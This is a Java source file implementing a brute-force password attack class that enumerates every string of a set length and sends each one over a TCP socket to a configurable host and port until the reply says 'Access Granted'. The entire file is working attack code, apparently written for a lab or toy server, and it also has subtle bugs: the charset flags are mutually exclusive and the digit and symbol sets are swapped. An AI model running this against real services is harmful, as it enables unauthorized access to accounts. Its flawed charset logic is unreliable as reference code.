package Cryptography.PasswordAttacks;

import java.io.*;
import java.net.Socket;
import java.util.*;
import java.util.concurrent.CompletableFuture;

public class BruteForceAttack implements Attacker {

    private ArrayList<String> Dictionary;
    public boolean IsAttackRunning = false;
    public float Progress = 0.0f;
    private int PasswordChunkDivisions = 2;
    private boolean PasswordFound;
    private boolean AttackHalted;
    private String MatchedPassword;
    private int Attempts = 0;
    private String TargetIP;
    private int TargetPort;

    public BruteForceAttack() {
        this.Dictionary = new ArrayList<>();
    }

    @Override
    public void StartAttack() {
        if (!this.IsAttackRunning) {
            Attempts = 0;
            AttackHalted = false;
            IsAttackRunning = true;
            CompletableFuture.runAsync(() -> {
                AttackInstance(Dictionary);
            });
        }
    }

    @Override
    public void StopAttack() {
        if (this.IsAttackRunning) {
            this.PasswordFound = true;
            this.AttackHalted = true;
            this.IsAttackRunning = false;
            var att_res = new AttackResult();
            att_res.Attempts = 0;
            att_res.AttackSuccessful = false;
            att_res.CrackedPassword = "";
            att_res.Duration = -1;
            NotifyResult(att_res);
        }
    }

    private void AttackInstance(List<String> Chunk) {
        var index = 0;
        long start = System.currentTimeMillis();
        while (!AttackHalted && !PasswordFound && index < Chunk.size()) {

            try {
                var csocket = new Socket(this.TargetIP, this.TargetPort);
                var input_stream = csocket.getInputStream();
                var output_stream = csocket.getOutputStream();
                var input_stream_reader = new BufferedReader(new InputStreamReader(input_stream));
                var output_stream_writer = new PrintWriter(output_stream, true);

                input_stream_reader.readLine();
                input_stream_reader.readLine();

//                These will help debug and print all attempts but it slows the app down
//                System.out.println("[BRUTEFORCE] Trying " + Chunk.get(index));
//                Debug("Trying" + Chunk.get(index)+"\n");

                output_stream_writer.println(Chunk.get(index) + '\n');
                var password_repsonse = input_stream_reader.readLine();

                this.Progress = ((float)(index + 1) / (float)this.Dictionary.size());
                if (password_repsonse.contains("Access Granted")) {
                    Debug("Password found successfully!\nPassword: " + Chunk.get(index) + "\n");
                    System.out.println("Password Found! : " + Chunk.get(index));
                    // Tracks time it takes to find password
                    long time = (System.currentTimeMillis() - start)/1000;
                    this.MatchedPassword = Chunk.get(index);
                    this.PasswordFound = true;
                    this.AttackHalted = true;
                    this.IsAttackRunning = false;
                    // Log attack result
                    var att_res = new AttackResult();
                    att_res.Attempts = index + 1;
                    att_res.AttackSuccessful = true;
                    att_res.CrackedPassword = Chunk.get(index);
                    att_res.Duration = time;

                    NotifyResult(att_res);
                    return;
                }

                input_stream.close();
                output_stream.close();
                csocket.close();
                index++;
                Attempts++;
            } catch (Exception e) {
                System.out.println("TCP client timeout");
            }
        }

        var att_res = new AttackResult();
        att_res.Attempts = index + 1;
        att_res.AttackSuccessful = false;
        att_res.CrackedPassword = "";
        att_res.Duration = -1;

        NotifyResult(att_res);
        Debug("Dictionary Exhausted\n");
    }

    //region Getters and Setters

    @Override
    public void SetTargetIP(String ip) {
        this.TargetIP = ip;
    }

    @Override
    public void SetTargetPort(int port) {
        this.TargetPort = port;
    }

    @Override
    public boolean IsAttackRunning() {
        return this.IsAttackRunning;
    }

    @Override
    public float GetProgress() {
        return this.Progress;
    }

    //endregion
    // region Dictionary Operations

    public int ConfigureAttack(int length, boolean Uppercase, boolean Lowercase, boolean SpecialChars, boolean Numbers) {
        var charset = new ArrayList<Character>();
        if (Lowercase) {
            charset.addAll(List.of('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'));
        } else if (Uppercase) {
            charset.addAll(List.of('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'));
        } else if (SpecialChars) {
            charset.addAll(List.of('1', '2', '3', '4', '5', '6', '7', '8', '9', '0'));
        } else if (Numbers) {
            charset.addAll(List.of('!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '-', '='));
        }

        this.Dictionary.clear();
        this.GeneratePermutations(charset, length);
        return this.Dictionary.size();
    }

    private void GeneratePermutations(List<Character> set, int k)
    {
        int n = set.size();
        GeneratePermutations(set, "", n, k);
    }



    private void GeneratePermutations(List<Character> set, String prefix, int n, int k) {

        if (k == 0)
        {
            this.Dictionary.add(prefix);
            return;
        }
        for (int i = 0; i < n; ++i) {
            String newPrefix = prefix + set.get(i);
            GeneratePermutations(set, newPrefix,
                    n, k - 1);
        }
    }

    //endregion

    //region Subscriptions

    private ArrayList<AttackResultListener> AttackResultSubscribers = new ArrayList<>();
    private ArrayList<DebugListener> DebugSubscribers = new ArrayList<>();

    @Override
    public void SubscribeToCompletion(AttackResultListener a) {
        AttackResultSubscribers.add(a);
    }

    @Override
    public void SubscribeToDebug(DebugListener d) {
        DebugSubscribers.add(d);
    }

    private void NotifyResult(AttackResult r) {
        for (var s : AttackResultSubscribers) {
            s.AttackCompleted(this, r);
        }
    }

    public void Debug(String msg) {
        System.out.println(msg);
        for (var d : DebugSubscribers) {
            d.OnDebug(this, msg);
        }
    }

    public void FinishAttack(AttackResult r) {
        for (var d : AttackResultSubscribers) {
            d.AttackCompleted(this, r);
        }
    }

    //endregion

    @Override
    public String toString() {
        return "Bruteforce Attack";
    }
}
